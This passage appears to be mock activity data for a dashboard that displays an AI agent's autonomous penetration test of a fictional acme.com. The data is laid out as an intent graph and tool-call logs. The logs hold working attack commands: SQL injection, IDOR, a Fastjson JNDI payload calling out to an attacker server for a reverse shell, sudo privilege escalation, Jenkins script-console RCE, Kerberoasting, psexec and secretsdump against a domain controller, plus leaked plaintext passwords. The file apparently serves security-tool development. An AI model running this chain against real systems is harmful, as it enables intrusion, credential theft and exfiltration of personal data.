    { src: "g1", dst: "i2", rel: "spawns" },
    { src: "g1", dst: "i3", rel: "spawns" },
    { src: "g2", dst: "i4", rel: "spawns" },
    { src: "g2", dst: "i5", rel: "spawns" },
    { src: "g2", dst: "ig", rel: "spawns" },
    { src: "g3", dst: "i6", rel: "spawns" },
    { src: "g3", dst: "i7", rel: "spawns" },
    { src: "g3", dst: "i8", rel: "spawns" },
    { src: "g4", dst: "i9", rel: "spawns" },
    { src: "g4", dst: "i10", rel: "spawns" },
    { src: "g4", dst: "i11", rel: "spawns" },
    { src: "g4", dst: "i12", rel: "spawns" },
    { src: "g4", dst: "i13", rel: "spawns" },
    // 意图 → 事实 / 漏洞（产出）
    { src: "i1", dst: "fa1", rel: "yields" },
    { src: "i4", dst: "fa2", rel: "yields" },
    { src: "i2", dst: "fi1", rel: "yields" },
    { src: "i4", dst: "fi2", rel: "yields" },
    { src: "i5", dst: "fi3", rel: "yields" },
    { src: "ig", dst: "faGit", rel: "yields" },
    { src: "ig", dst: "faCreds", rel: "yields" },
    { src: "ig", dst: "fiSrc", rel: "yields" },
    { src: "i6", dst: "fa3", rel: "yields" },
    { src: "i7", dst: "fa4", rel: "yields" },
    { src: "i7", dst: "fiRce", rel: "yields" },
    { src: "i8", dst: "fa5", rel: "yields" },
    { src: "i8", dst: "fiPriv", rel: "yields" },
    { src: "i9", dst: "fa6", rel: "yields" },
    { src: "i9", dst: "fa7", rel: "yields" },
    { src: "i11", dst: "fa8", rel: "yields" },
    { src: "i11", dst: "fa9", rel: "yields" },
    { src: "i11", dst: "fiJenkins", rel: "yields" },
    { src: "i12", dst: "fa10", rel: "yields" },
    { src: "i12", dst: "fiKerb", rel: "yields" },
    { src: "i13", dst: "fiDC", rel: "yields" },
    // 事实 → 新意图（事实驱动的多层递进）
    { src: "fa3", dst: "i7", rel: "derived_from" },
    { src: "fa4", dst: "i8", rel: "derived_from" },
    { src: "fa4", dst: "i9", rel: "derived_from" },
    { src: "faCreds", dst: "i10", rel: "derived_from" },
    { src: "fa7", dst: "i11", rel: "derived_from" },
    { src: "fa7", dst: "i12", rel: "derived_from" },
    { src: "fa9", dst: "i13", rel: "derived_from" },
    { src: "fa10", dst: "i13", rel: "derived_from" },
    // 提示 → 意图
    { src: "h1", dst: "i2", rel: "derived_from" },
    { src: "h2", dst: "i11", rel: "derived_from" },
    { src: "h3", dst: "i10", rel: "derived_from" },
    // 漏洞 → 证明目标达成
    { src: "fi1", dst: "g1", rel: "proves" },
    { src: "fiRce", dst: "g3", rel: "proves" },
    { src: "fiDC", dst: "g4", rel: "proves" },
  ],
};

export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
export const frontier: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent" && (n.state === "open" || n.state === "running"));

// ── Activity（执行过程）─────────────────────────────────────────────────────
// 会话由 sessions-tab 从「意图」派生（session.id = intent.id），transcript = 匹配
// intent_id 的活动流。planner=worker "planner"、主 agent=worker "mainagent"。
// 每个 worker 会话含完整工具执行链（tool_use → tool_result → …→ result）。
export const activity: Activity[] = [
  // planner
  { seq: 1, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
  { seq: 2, worker: "planner", ts: T("2026-07-24T09:12:30Z"), kind: "thinking", summary: "acme.com 是企业站，攻击面：官网(www)、后台(admin)、API(api)、商城(shop)。先枚举资产，再挑高价值目标。" },
  { seq: 3, worker: "planner", ts: T("2026-07-24T09:13:00Z"), kind: "text", summary: "拆出两个目标：① 获取后台管理权限 ② 读取用户敏感数据。派生首批意图：子域枚举、后台口令测试、注入探测、API 越权。" },
  { seq: 300, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "第 1 轮 · 攻击面加码" },
  { seq: 301, worker: "planner", ts: T("2026-07-25T14:12:20Z"), kind: "text", summary: ".git 泄露出源码+硬编码 DB 口令，shop 指纹疑似 Fastjson。新增目标③「突破 DMZ 建立内网立足点」，派生指纹关联、反序列化 RCE 两条意图。" },
  { seq: 302, worker: "planner", ts: T("2026-07-25T20:25:00Z"), kind: "round", summary: "第 2 轮 · 立足点已建，转内网" },
  { seq: 303, worker: "planner", ts: T("2026-07-25T20:26:00Z"), kind: "text", summary: "RCE 拿到 www-data 并提权 root，立足点双网卡直连 10.10.10.0/24（g3 达成）。新增目标④「拿下内部靶标 DC01」，派生内网主机发现、凭据复用、Jenkins 利用、Kerberoasting 四条意图。" },
  { seq: 304, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "第 3 轮 · 靶标达成复盘" },
  { seq: 305, worker: "planner", ts: T("2026-07-26T00:26:00Z"), kind: "text", summary: "svc_deploy 属于 Domain Admins，已 psexec 拿下 DC01 并 secretsdump 全域哈希（g4 达成）。内外网链路打通，收敛剩余 g2（后台批量用户数据）。" },
  { seq: 4, worker: "planner", ts: T("2026-07-26T03:55:00Z"), kind: "round", summary: "第 4 轮 · 复盘" },
  { seq: 5, worker: "planner", ts: T("2026-07-26T03:55:10Z"), kind: "text", summary: "后台已拿下(g1 达成)。继续 g2：派生「枚举后台用户接口」「API IDOR 测试」两条意图并提高优先级。" },

  // work#1 · i1 子域枚举与端口扫描（done）
  { seq: 10, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:00Z"), kind: "thinking", summary: "先被动侦察子域，再对存活主机做端口/服务识别。" },
  { seq: 11, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11", summary: "subfinder -d acme.com -silent | httpx -silent -sc -title" },
  { seq: 12, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:22:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11", summary: "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]", detail: "5 个存活子域，其中 admin 是后台登录页。" },
  { seq: 13, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:23:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12", summary: "nmap -sV -T4 -p- 203.0.113.10" },
  { seq: 14, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:26:40Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12", summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0", detail: "开放 22/80/443。" },
  { seq: 15, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:00Z"), kind: "tool_use", tool: "upsert_asset", tool_use_id: "t13", summary: "upsert_asset × 6（子域+服务）" },
  { seq: 16, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:01Z"), kind: "tool_result", tool: "upsert_asset", tool_use_id: "t13", summary: "6 assets upserted" },
  { seq: 17, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:40:00Z"), kind: "result", summary: "资产侦察完成，发现后台 admin.acme.com，交回图。", input_tokens: 96000, output_tokens: 6100, cache_read_tokens: 61000, cache_write_tokens: 9000 },

  // work#2 · i2 后台默认口令（done，证明 g1）
  { seq: 20, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:31:00Z"), kind: "thinking", summary: "后台是 Element-UI，登录接口无验证码、无速率限制。先试默认口令表，再上字典。" },
  { seq: 21, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t21", summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'" },
  { seq: 22, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t21", summary: "401", detail: "admin/admin 失败。" },
  { seq: 23, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t22", summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login" },
  { seq: 24, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:33Z"), kind: "tool_result", tool: "bash", tool_use_id: "t22", summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard", detail: "admin/admin123 登录成功，拿到会话 cookie。" },
  { seq: 25, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "t23", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'" },
  { seq: 26, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "t23", summary: "<title>Acme Admin · 控制台", detail: "确认已进入后台控制台。" },
  { seq: 27, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t24", summary: "report_finding(Default Credentials, high)" },
  { seq: 28, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t24", summary: "finding f-6 已记录，并连到目标 g1（proves）" },
  { seq: 29, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:50:00Z"), kind: "result", summary: "后台默认口令确认，目标①达成。", input_tokens: 72000, output_tokens: 4800, cache_read_tokens: 48000, cache_write_tokens: 7200 },

  // work#4 · i4 SQL 注入（done）
  { seq: 40, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:01:00Z"), kind: "thinking", summary: "search?q= 结果页把 q 拼进标题，先手工加单引号看报错。" },
  { seq: 41, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t41", summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'" },
  { seq: 42, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:04Z"), kind: "tool_result", tool: "bash", tool_use_id: "t41", summary: "Unclosed quotation mark ... near '1'.", detail: "MSSQL 报错型注入迹象。" },
  { seq: 43, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:03:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t42", summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2" },
  { seq: 44, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:18:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t42", summary: "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb", detail: "确认可注入，枚举出 4 个库。" },
  { seq: 45, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t43", summary: "report_finding(SQL Injection, high)" },
  { seq: 46, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t43", summary: "finding f-1 已记录" },
  { seq: 47, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:20:00Z"), kind: "result", summary: "SQL 注入确认。", input_tokens: 118000, output_tokens: 7400, cache_read_tokens: 82000, cache_write_tokens: 11000 },

  // work#5 · i5 IDOR（running）
  { seq: 50, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:31:00Z"), kind: "thinking", summary: "/v1/orders?id= 是数字自增 id，典型 IDOR 面。先取自己的单，再改 id 看能否读他人。" },
  { seq: 51, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t51", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001" },
  { seq: 52, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t51", summary: "{ \"order_id\":1001, \"user_id\":42, \"amount\":299 }", detail: "自己的订单，正常。" },
  { seq: 53, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t52", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002" },
  { seq: 54, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t52", summary: "{ \"order_id\":1002, \"user_id\":77, \"amount\":1299, \"phone\":\"138****6021\", \"address\":\"北京市朝阳区 ****\" }", detail: "越权读到他人订单（含手机号/地址），无归属校验。" },
  { seq: 55, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t53", summary: "report_finding(IDOR, high)" },
  { seq: 56, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t53", summary: "finding f-2 已记录" },
  { seq: 57, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T03:58:10Z"), kind: "thinking", summary: "正在批量遍历 id 范围，评估可越权数据规模（暂不导出，避免触发拦截规则）。" },

  // work#3 · i3 后台用户接口枚举（running）
  { seq: 60, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:56:00Z"), kind: "thinking", summary: "已有后台会话，枚举管理接口，找能批量导出用户敏感数据的入口（目标②）。" },
  { seq: 61, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t61", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1" },
  { seq: 62, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t61", summary: "{ \"total\": 12840, \"items\": [ { \"id\":1, \"email\":\"a***@acme.com\", \"phone\":\"139****\" } ] }", detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。" },
  { seq: 63, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:58:20Z"), kind: "thinking", summary: "确认存在批量用户数据读取入口；导出动作命中破坏性/外泄规则，已提交拦截审批等待放行。" },

  // workG · ig .git 源码泄露与硬编码凭据（done）
  { seq: 310, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:26:00Z"), kind: "thinking", summary: "robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。" },
  { seq: 311, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:27:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "tg1", summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD" },
  { seq: 312, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:27:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "tg1", summary: "200", detail: ".git 目录对外可访问。" },
  { seq: 313, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:28:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "tg2", summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head" },
  { seq: 314, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:30:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "tg2", summary: "还原 214 个文件；HEAD=main。config.php / db.php 在列。", detail: "完整后端源码已还原到 /tmp/acme。" },
  { seq: 315, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:34:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "tg3", summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php" },
  { seq: 316, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:34:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "tg3", summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';", detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。" },
  { seq: 317, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:36:00Z"), kind: "result", summary: "源码泄露 + 硬编码 DB 凭据确认，凭据入图供后续内网复用。", input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },

  // work#6 · i6 shop 指纹与 CVE 关联（done）
  { seq: 320, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:22:00Z"), kind: "thinking", summary: "shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。" },
  { seq: 321, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:24:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t6a", summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'" },
  { seq: 322, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:24:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t6a", summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...", detail: "Java 技术栈，存在 /api/import 接受 JSON body。" },
  { seq: 323, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:30:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t6b", summary: "curl -s -H 'Content-Type: application/json' -d '{\"a\":{\"@type\":\"java.lang.AutoCloseable\"}}' https://shop.acme.com/api/import" },
  { seq: 324, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:31:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t6b", summary: "报错栈含 com.alibaba.fastjson.JSONException（1.2.24）", detail: "确认 Fastjson 1.2.24 —— 对应 JdbcRowSetImpl JNDI 注入 RCE。" },
  { seq: 325, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:40:00Z"), kind: "result", summary: "指纹命中 Fastjson 1.2.24，反序列化 RCE 面成立，交给利用意图。", input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },

  // work#7 · i7 反序列化 RCE 拿反弹 shell（done，证明 g3）
  { seq: 330, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:12:00Z"), kind: "thinking", summary: "起一个 JNDI/LDAP 恶意服务，让 shop 反连加载执行 payload，先 dnslog 验证出网，再落反弹 shell。" },
  { seq: 331, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:15:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t7a", summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务" },
  { seq: 332, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:16:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t7a", summary: "LDAP Server started on 1389, HTTP on 8180", detail: "恶意服务就绪。" },
  { seq: 333, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:20:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t7b", summary: "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444\",\"autoCommit\":true}' https://shop.acme.com/api/import" },
  { seq: 334, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:21:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t7b", summary: "LDAP 收到请求 → 加载 ReverseShell → nc 监听收到连接", detail: "payload 成功触发。" },
  { seq: 335, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:24:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t7c", summary: "id; hostname -I  # 反弹 shell 内确认身份与网段" },
  { seq: 336, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:24:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t7c", summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15", detail: "www-data@dmz-web01，且第二网卡 10.10.10.x —— 已进入 DMZ 且贴内网。" },
  { seq: 337, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:30:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t7d", summary: "report_finding(Deserialization RCE, high)" },
  { seq: 338, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:40:00Z"), kind: "result", summary: "反序列化 RCE 拿到 www-data 反弹 shell，目标③立足点初步建立。", input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },

  // work#8 · i8 立足点提权（done）
  { seq: 340, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:02:00Z"), kind: "thinking", summary: "www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。" },
  { seq: 341, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:05:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t8a", summary: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head" },
  { seq: 342, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:05:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t8a", summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3", detail: "sudo 白名单里 python3 且免密 —— 直接可提权。" },
  { seq: 343, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:10:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t8b", summary: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'" },
  { seq: 344, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:10:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t8b", summary: "uid=0(root) gid=0(root) groups=0(root)", detail: "已提权 root。" },
  { seq: 345, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:14:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t8c", summary: "report_finding(Privilege Escalation, high)" },
  { seq: 346, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:20:00Z"), kind: "result", summary: "本地提权 root 完成，立足点稳固；准备以其为 pivot 打内网。", input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },

  // work#9 · i9 内网主机发现（done）
  { seq: 350, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T20:32:00Z"), kind: "thinking", summary: "立足点直连 10.10.10.0/24，用 fscan/内网扫描做主机与端口发现，圈定域控与高价值主机。" },
  { seq: 351, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T20:36:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t9a", summary: "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30" },
  { seq: 352, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T20:55:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t9a", summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080", detail: "圈定域控 DC01、文件服务器 FS01、内部 Jenkins。" },
  { seq: 353, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T21:00:00Z"), kind: "result", summary: "内网主机发现完成，3 台高价值目标入图。", input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },

  // work#10 · i10 内网凭据复用（running）
  { seq: 360, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:42:00Z"), kind: "thinking", summary: "源码泄露的 sa/Acme@2021 是 DB 口令，企业常见口令复用。对 DC01/FS01/JENKINS 做密码喷洒。" },
  { seq: 361, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:44:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t10a", summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'" },
  { seq: 362, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:44:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t10a", summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败", detail: "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。" },
  { seq: 363, worker: "work#10", intent_id: "i10", ts: T("2026-07-26T03:50:00Z"), kind: "thinking", summary: "FS01 已拿下，正在枚举共享目录寻找更多凭据和敏感文件……" },

  // work#11 · i11 Jenkins 未授权 RCE（done）
  { seq: 370, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:32:00Z"), kind: "thinking", summary: "JENKINS 8080 直接可访问，先看 /script 控制台是否需要认证。" },
  { seq: 371, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:35:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11a", summary: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'" },
  { seq: 372, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:35:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11a", summary: "200", detail: "Script Console 无需登录即可访问。" },
  { seq: 373, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:40:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11b", summary: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText" },
  { seq: 374, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:40:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11b", summary: "nt authority\\system", detail: "Groovy 以 SYSTEM 权限执行。" },
  { seq: 375, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:44:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11c", summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库" },
  { seq: 376, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:45:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11c", summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!", detail: "两个域服务账号明文口令导出。" },
  { seq: 377, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:48:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t11d", summary: "report_finding(Unauthenticated RCE, high)" },
  { seq: 378, worker: "work#11", intent_id: "i11", ts: T("2026-07-25T21:50:00Z"), kind: "result", summary: "Jenkins 未授权 RCE 确认，并导出两个域服务账号凭据。", input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },

  // work#12 · i12 Kerberoasting（done）
  { seq: 380, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T22:42:00Z"), kind: "thinking", summary: "用 svc_deploy 凭据做域认证，然后 GetUserSPNs 请求可 Kerberoast 的服务账号 TGS。" },
  { seq: 381, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T22:50:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12a", summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request" },
  { seq: 382, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T22:52:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12a", summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...", detail: "拿到 svc_sql 的 TGS 票据（Kerberos RC4）。" },
  { seq: 383, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:10:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12b", summary: "hashcat -m 13100 tgs.hash rockyou.txt --force" },
  { seq: 384, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:18:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12b", summary: "$krb5tgs$23$*svc_sql$...:Sql@2020", detail: "8 分钟破出口令 Sql@2020。" },
  { seq: 385, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:19:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t12c", summary: "report_finding(Kerberoasting, high)" },
  { seq: 386, worker: "work#12", intent_id: "i12", ts: T("2026-07-25T23:20:00Z"), kind: "result", summary: "Kerberoasting 破出 svc_sql 口令，入图供域控攻击使用。", input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },

  // work#13 · i13 拿下域控 DC01（done，证明 g4）
  { seq: 390, worker: "work#13", intent_id: "i13", ts: T("2026-07-25T23:52:00Z"), kind: "thinking", summary: "svc_deploy 来自 Jenkins 凭据库，先查组成员资格——若属于 Domain Admins 就可直接 psexec DC01。" },
  { seq: 391, worker: "work#13", intent_id: "i13", ts: T("2026-07-25T23:55:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t13a", summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10" },
  { seq: 392, worker: "work#13", intent_id: "i13", ts: T("2026-07-25T23:55:05Z"), kind: "tool_result", tool: "bash", tool_use_id: "t13a", summary: "ACME\\Administrator\nACME\\svc_deploy", detail: "svc_deploy 是 Domain Admins 成员。" },
  { seq: 393, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:00:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t13b", summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10" },
  { seq: 394, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:00:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t13b", summary: "C:\\Windows\\system32> whoami\nnt authority\\system", detail: "以 SYSTEM 身份登录域控 DC01。" },
  { seq: 395, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:05:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t13c", summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc" },
